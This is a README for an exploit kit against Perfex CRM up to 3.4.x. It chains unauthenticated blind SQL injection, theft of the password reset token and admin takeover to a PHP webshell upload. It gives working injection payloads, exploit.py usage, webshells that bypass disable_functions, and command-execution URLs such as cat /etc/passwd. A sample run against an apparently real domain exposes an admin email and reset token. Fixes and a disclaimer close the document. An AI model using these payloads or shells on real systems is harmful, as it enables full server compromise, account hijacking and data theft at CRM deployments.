# Perfex CRM <= 3.4.x — Unauthenticated RCE via Migration SQLi + Arbitrary File Upload

**Vulnerability Summary**

The popular CRM platform **Perfex CRM** versions **<= 3.4.x** is vulnerable to a **full unauthenticated Remote Code Execution** chain. This critical flaw allows any unauthenticated attacker to achieve complete server compromise — from zero access to OS command execution — without any user interaction.

The attack chain exploits **three separate vulnerabilities** in sequence:

1. **Unauthenticated SQL Injection** in the Migration controller (`/migration/make`) — the `old_base_url` GET parameter is concatenated directly into UPDATE queries without sanitization or prepared statements.

2. **Password Reset Token Extraction** — using boolean-based blind SQLi to extract `new_pass_key` from `tblstaff`, allowing the attacker to hijack any admin account.

3. **Arbitrary File Upload without Extension Validation** — the `handle_sales_attachments()` function in the upload helper performs **zero extension checking**, allowing direct PHP webshell upload to a web-accessible directory (`uploads/newsfeed/`).

**Breakthrough Discovery:** While the Migration SQLi was known in older versions, the combination with the sales file upload (which completely lacks extension validation unlike ALL other upload handlers) creates a reliable **unauthenticated-to-RCE** chain. The `handle_sales_attachments()` function uses `move_uploaded_file()` directly — no `_upload_extension_allowed()` check, no MIME validation, no image verification. Combined with the fact that `uploads/newsfeed/` has no `.htaccess` protection, uploaded PHP files execute immediately.

> **Note:** The Migration controller requires `migration_enabled = true` in config. In default installations this is FALSE, but many production deployments leave it enabled after initial setup/migration, and it is often toggled during updates. The SQLi itself requires no authentication — the controller extends `App_Controller` with no auth middleware.

---

## Affected Software

| Field | Value |
|---|---|
| Software | Perfex CRM (by Developer Portal) |
| Affected Version | <= 3.4.x (tested on 3.3.0 and 3.4.0) |
| Vulnerability Type | Unauthenticated RCE (SQLi → Account Takeover → Arbitrary Upload) |
| CVSS Score | 9.8 (Critical) |
| CWE | CWE-89 (SQL Injection), CWE-434 (Unrestricted File Upload), CWE-640 (Weak Password Recovery) |
| Impact | Full Server Compromise — Remote Code Execution as `www-data` |

---

## What Attackers Can Do

| Capability | Impact |
|---|---|
| Upload PHP webshell to web-accessible directory | **Remote Code Execution** |
| Extract & reset any staff/admin password | **Full Account Takeover** |
| Read database credentials, `.env`, configs | **Sensitive Data Exposure** |
| Dump entire database (customers, invoices, contracts) | **Data Breach** |
| Execute OS commands as `www-data` | **Full Server Compromise** |
| Install persistent backdoors, pivot to internal network | **Lateral Movement** |

---

## Vulnerable Code

### Vulnerability 1: SQL Injection in Migration Controller

```php
// application/controllers/Migration.php — make() method

public function make()
{
    // NO AUTHENTICATION CHECK!

    $old_url = $this->input->get('old_base_url');  // ← Attacker-controlled
    $new_url = $this->config->item('base_url');

    foreach ($tables as $t) {
        // Direct concatenation into raw SQL query!
        $this->db->query('UPDATE `' . $t['table'] . '` SET `' . $t['field']
            . '` = replace(' . $t['field'] . ', "' . $old_url . '", "' . $new_url . '")');
        //                                          ^^^^^^^^^^^
        //                             NO escaping, NO prepared statement!
    }
}
```

**Boolean-based blind exploitation:**
```
# TRUE condition (slow — processes all rows):
/migration/make?old_base_url=x", "y") WHERE (SELECT IF((1=1), 1, 0)) = 1 -- /

# FALSE condition (fast — skips all rows):
/migration/make?old_base_url=x", "y") WHERE (SELECT IF((1=0), 1, 0)) = 1 -- /
```

### Vulnerability 2: Arbitrary File Upload (No Extension Check)

```php
// application/helpers/upload_helper.php — handle_sales_attachments()

function handle_sales_attachments($rel_id, $rel_type)
{
    $path = get_upload_path_by_type($rel_type) . $rel_id . '/';

    $type = $_FILES['file']['type'];
    _maybe_create_upload_path($path);
    $filename = unique_filename($path, $_FILES['file']['name']);
    $newFilePath = $path . $filename;

    // VULNERABILITY: Direct move_uploaded_file() — NO extension check!
    if (move_uploaded_file($tmpFilePath, $newFilePath)) {
        // File saved as-is — .php, .phtml, .phar all accepted!
    }
}
```

### Vulnerability 3: No Authentication on Migration Controller

```php
// application/controllers/Migration.php
class Migration extends App_Controller  // ← NOT AdminController!
{
    public function make()
    {
        // Only checks config flag — NO login required!
        if ($this->config->item('migration_enabled') !== true) {
            die;
        }
    }
}
```

---

## Usage

### Basic usage

```bash
python3 exploit.py https://target.com --filebackdoor cmd7.php
```

### With backup shell (fallback if primary fails)

```bash
python3 exploit.py https://target.com --filebackdoor cmd7.php --backup cmd83.php
```

### Target different staff ID

```bash
python3 exploit.py https://target.com --filebackdoor cmd7.php --backup cmd83.php --staff-id 2
```

### Custom remote filename

```bash
python3 exploit.py https://target.com --filebackdoor cmd7.php -o assets.php
```

### Options

| Flag | Description |
|---|---|
| `target` | Target base URL (positional argument) |
| `--filebackdoor` | PHP shell to upload (required) |
| `--backup` | Backup shell if primary doesn't respond |
| `--staff-id` | Staff ID to target (default: 1) |
| `--timeout` | Boolean SQLi timeout in seconds (default: 8) |
| `-o, --output` | Remote filename (default: random `yuca_*.php`) |

---

## Interactive Exploit Flow

The script runs an interactive chain. You only need to manually change the password via browser — everything else is automated.

```
$ python3 exploit.py https://console.ewadc.com --filebackdoor cmd7.php --backup cmd83.php

  ┌─────────────────────────────────────────────────────────────┐
  │  Phase 1: SQL Injection                                     │
  │  → Tests /migration/make for blind SQLi                     │
  │  [+] SQL Injection confirmed!                               │
  ├─────────────────────────────────────────────────────────────┤
  │  Phase 2: Extract Admin Email                               │
  │  → Boolean-based blind extraction from tblstaff             │
  │  [+] Admin email: office@ewadc.com                          │
  ├─────────────────────────────────────────────────────────────┤
  │  Phase 3: Password Reset                                    │
  │  → Triggers forgot_password, then extracts token via SQLi   │
  │  [+] Reset token: fd7fbbf58f8137cac50ec40cec0699ee          │
  │                                                             │
  │  ┌───────────────────────────────────────────────────────┐  │
  │  │  Reset link found! Open this URL in your browser:     │  │
  │  │                                                       │  │
  │  │  https://target.com/admin/authentication/             │  │
  │  │    reset_password/1/1/fd7fbbf58f8137cac50ec40cec...   │  │
  │  │                                                       │  │
  │  │  Set a new password, then come back here.             │  │
  │  └───────────────────────────────────────────────────────┘  │
  │                                                             │
  │  [?] Enter the new password you just set: ████████          │
  ├─────────────────────────────────────────────────────────────┤
  │  Phase 4: Admin Login                                       │
  │  → Logs in with extracted email + your new password         │
  │  [+] Login successful!                                      │
  ├─────────────────────────────────────────────────────────────┤
  │  Phase 5: Upload Backdoor                                   │
  │  → Uploads via /admin/misc/upload_sales_file (no ext check) │
  │  [+] Uploaded → https://target.com/uploads/newsfeed/1/...   │
  ├─────────────────────────────────────────────────────────────┤
  │  Phase 6: Verify RCE                                        │
  │  → Tests shell with ?cmd=echo YUCA_OK                       │
  │  → If primary fails, auto-uploads backup shell              │
  │  [+] Shell is alive! (parameter: ?cmd=)                     │
  │                                                             │
  │    $ id                                                     │
  │    uid=33(www-data) gid=33(www-data) groups=33(www-data)    │
  │                                                             │
  │  ┌───────────────────────────────────────────────────────┐  │
  │  │  Backdoor location:                                   │  │
  │  │  https://target.com/uploads/newsfeed/1/yuca_x8k2.php  │  │
  │  │                                                       │  │
  │  │  curl 'https://target.com/.../yuca_x8k2.php?cmd=id'  │  │
  │  └───────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────┘
```

---

## Shells Included

### cmd7.php — PHP 7.3 to 8.1

mm0r1 UAF `disable_functions` bypass. Works on all PHP 7.3-8.1 versions (*nix only).

```
https://target.com/uploads/newsfeed/1/shell.php?cmd=id
https://target.com/uploads/newsfeed/1/shell.php?cmd=cat /etc/passwd
```

**Parameter:** `?cmd=<command>`

### cmd83.php — PHP 8.2 to 8.5

TimeAfterFree `disable_functions` bypass for newer PHP versions.

```
https://target.com/uploads/newsfeed/1/shell.php?cmd=id
https://target.com/uploads/newsfeed/1/shell.php?cmd=uname -a
```

**Parameter:** `?cmd=<command>`

### Backup shell logic

If the primary shell (`--filebackdoor`) doesn't respond after upload (e.g. PHP version mismatch), the exploit automatically uploads the backup shell (`--backup`) and tests again:

```bash
# cmd7.php for PHP 7.x-8.1, cmd83.php as fallback for PHP 8.2+
python3 exploit.py https://target.com --filebackdoor cmd7.php --backup cmd83.php
```

---

## Exploit Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER (No Auth)                        │
└─────────────────────┬───────────────────────────────────────┘
                      │
          ┌───────────▼───────────────┐
          │  1. SQLi: /migration/make │ ← No authentication required
          │     Extract admin email   │    Boolean-based blind (timing)
          └───────────┬───────────────┘
                      │
          ┌───────────▼───────────────┐
          │  2. Trigger forgot_password│ ← Generates new_pass_key in DB
          │     for extracted email   │
          └───────────┬───────────────┘
                      │
          ┌───────────▼───────────────┐
          │  3. SQLi: Extract token   │ ← 32 hex chars from tblstaff
          │     new_pass_key value    │    ~3 minutes extraction time
          └───────────┬───────────────┘
                      │
          ┌───────────▼───────────────────────────┐
          │  4. Give reset link to operator        │ ← Interactive step
          │     Operator changes password manually │
          │     Script asks for the new password   │
          └───────────┬───────────────────────────┘
                      │
          ┌───────────▼───────────────┐
          │  5. Login as admin        │ ← email + new password
          └───────────┬───────────────┘
                      │
          ┌───────────▼───────────────┐
          │  6. Upload shell.php      │ ← POST /admin/misc/upload_sales_file
          │     type=newsfeed         │    NO extension check in handler!
          │     → uploads/newsfeed/1/ │    File executes as PHP immediately
          └───────────┬───────────────┘
                      │
          ┌───────────▼───────────────────────────┐
          │  7. Verify RCE                        │ ← ?cmd=echo YUCA_OK
          │     If fails → upload backup shell    │
          │     curl shell.php?cmd=id             │
          └───────────────────────────────────────┘
```

---

## Fix Recommendations

### Fix 1: Disable Migration Controller (Immediate)

```php
// application/config/migration.php
$config['migration_enabled'] = false;  // MUST be false in production!
```

### Fix 2: Add Extension Validation to handle_sales_attachments()

```php
function handle_sales_attachments($rel_id, $rel_type)
{
    // ADD THIS CHECK:
    if (!_upload_extension_allowed($_FILES['file']['name'])) {
        header('HTTP/1.0 400 Bad Request');
        echo 'File extension not allowed';
        die;
    }
    // ... rest of function
}
```

### Fix 3: Add Authentication to Migration Controller

```php
class Migration extends AdminController  // ← Change from App_Controller
{
    public function __construct()
    {
        parent::__construct();
        if (!is_admin()) {
            show_404();
        }
    }
}
```

### Fix 4: Use Prepared Statements

```php
$this->db->query('UPDATE ... replace(field, ?, ?)', [$old_url, $new_url]);
```

### Fix 5: Add .htaccess to Upload Directories

```apache
# uploads/newsfeed/.htaccess
<FilesMatch "\.ph(p|tml|ar|ps)$">
    Require all denied
</FilesMatch>
```

---

## Files

| File | Description |
|---|---|
| `exploit.py` | Full automated exploit chain (Python 3, interactive) |
| `cmd7.php` | mm0r1 UAF disable_functions bypass — PHP 7.3-8.1, param: `?cmd=` |
| `cmd83.php` | TimeAfterFree disable_functions bypass — PHP 8.2-8.5, param: `?cmd=` |
| `README.md` | This file |

---

## Researcher

- Credit: [Yucaerin](https://yucaerin.github.io/)

---

## References

- [Perfex CRM Official](https://www.perfexcrm.com/)
- [Perfex CRM Product](https://codecanyon.net/item/perfex-powerful-open-source-crm/14013737)
- [CodeIgniter 3 Security](https://codeigniter.com/userguide3/libraries/security.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-434: Unrestricted Upload](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-640: Weak Password Recovery](https://cwe.mitre.org/data/definitions/640.html)

---

## Disclaimer

This information is provided for **educational** and **authorized penetration testing** purposes only. Unauthorized exploitation of computer systems is illegal and unethical. Always obtain explicit written permission before testing any target you do not own.
